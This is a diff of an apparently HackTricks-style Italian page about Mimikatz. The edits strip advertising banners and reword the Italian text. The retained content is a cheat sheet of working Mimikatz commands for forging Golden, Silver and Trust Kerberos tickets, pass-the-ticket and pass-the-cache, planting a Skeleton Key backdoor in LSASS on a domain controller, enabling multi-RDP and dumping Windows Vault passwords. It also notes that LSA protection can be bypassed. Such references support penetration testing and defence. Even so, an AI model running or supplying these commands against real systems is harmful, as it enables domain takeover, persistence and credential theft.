@@ -2,25 +2,19 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Approfondisci la tua esperienza in **Mobile Security** con 8kSec Academy. Masterizza la sicurezza di iOS e Android attraverso i nostri corsi autogestiti e ottieni la certificazione:
-
-{% embed url="https://academy.8ksec.io/" %}
-
 **Questa pagina si basa su una di [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Controlla l'originale per ulteriori informazioni!
 
 ## LM e Clear-Text in memoria
 
 A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere contro il furto di credenziali:
 
-- **LM hashes e password in chiaro** non sono più memorizzati in memoria per migliorare la sicurezza. Una specifica impostazione del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve essere configurata con un valore DWORD di `0` per disabilitare l'autenticazione Digest, assicurando che le password "in chiaro" non siano memorizzate nella cache di LSASS.
+- **LM hashes e password in chiaro** non sono più memorizzati in memoria per migliorare la sicurezza. Un'impostazione specifica del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve essere configurata con un valore DWORD di `0` per disabilitare l'autenticazione Digest, assicurando che le password "in chiaro" non siano memorizzate nella cache di LSASS.
 
 - **LSA Protection** è stata introdotta per proteggere il processo dell'Autorità di Sicurezza Locale (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo viene realizzato contrassegnando LSASS come processo protetto. L'attivazione della protezione LSA comporta:
 1. Modificare il registro in _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
 2. Implementare un Oggetto Criteri di Gruppo (GPO) che applica questa modifica del registro sui dispositivi gestiti.
 
-Nonostante queste protezioni, strumenti come Mimikatz possono eludere la protezione LSA utilizzando driver specifici, anche se tali azioni sono destinate a essere registrate nei log degli eventi.
+Nonostante queste protezioni, strumenti come Mimikatz possono eludere la protezione LSA utilizzando driver specifici, anche se tali azioni sono probabilmente registrate nei log degli eventi.
 
 ### Contro il Ritiro di SeDebugPrivilege
 
@@ -57,7 +51,7 @@ La manomissione dei registri eventi in Mimikatz comporta due azioni principali: 
 
 ### Creazione di un Golden Ticket
 
-Un Golden Ticket consente l'impersonificazione con accesso a livello di dominio. Comando chiave e parametri:
+Un Golden Ticket consente l'accesso per impersonificazione a livello di dominio. Comando chiave e parametri:
 
 - Comando: `kerberos::golden`
 - Parametri:
@@ -72,7 +66,7 @@ Esempio:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Creazione di Silver Ticket
+### Creazione del Silver Ticket
 
 I Silver Ticket concedono accesso a servizi specifici. Comando chiave e parametri:
 
@@ -85,9 +79,9 @@ Esempio:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Creazione di Trust Ticket
+### Creazione del Trust Ticket
 
-I Trust Ticket vengono utilizzati per accedere a risorse tra domini sfruttando le relazioni di fiducia. Comando chiave e parametri:
+I Trust Ticket vengono utilizzati per accedere alle risorse tra domini sfruttando le relazioni di fiducia. Comando e parametri chiave:
 
 - Comando: Simile al Golden Ticket ma per le relazioni di fiducia.
 - Parametri:
@@ -100,7 +94,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 ```
 ### Comandi Aggiuntivi di Kerberos
 
-- **Elenco dei Ticket**:
+- **Elenco Ticket**:
 
 - Comando: `kerberos::list`
 - Elenca tutti i ticket Kerberos per la sessione utente corrente.
@@ -108,7 +102,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **Passa la Cache**:
 
 - Comando: `kerberos::ptc`
-- Inietta i ticket Kerberos dai file di cache.
+- Inietta ticket Kerberos da file di cache.
 - Esempio: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Passa il Ticket**:
@@ -117,7 +111,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Consente di utilizzare un ticket Kerberos in un'altra sessione.
 - Esempio: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Pulisci i Ticket**:
+- **Pulisci Ticket**:
 - Comando: `kerberos::purge`
 - Cancella tutti i ticket Kerberos dalla sessione.
 - Utile prima di utilizzare comandi di manipolazione dei ticket per evitare conflitti.
@@ -158,7 +152,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Varie
 
-- **MISC::Skeleton**: Inietta una backdoor in LSASS su un DC.
+- **MISC::Skeleton**: Inietta un backdoor in LSASS su un DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Escalation dei Privilegi
@@ -195,7 +189,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: Elenca le sessioni TS/RDP.
+- **TS::Sessions**: Elenca sessioni TS/RDP.
 - _Nessun comando specifico fornito per TS::Sessions nel contesto originale._
 
 ### Vault
@@ -203,10 +197,5 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Estrai password da Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Approfondisci la tua esperienza in **Mobile Security** con 8kSec Academy. Masterizza la sicurezza di iOS e Android attraverso i nostri corsi autogestiti e ottieni la certificazione:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
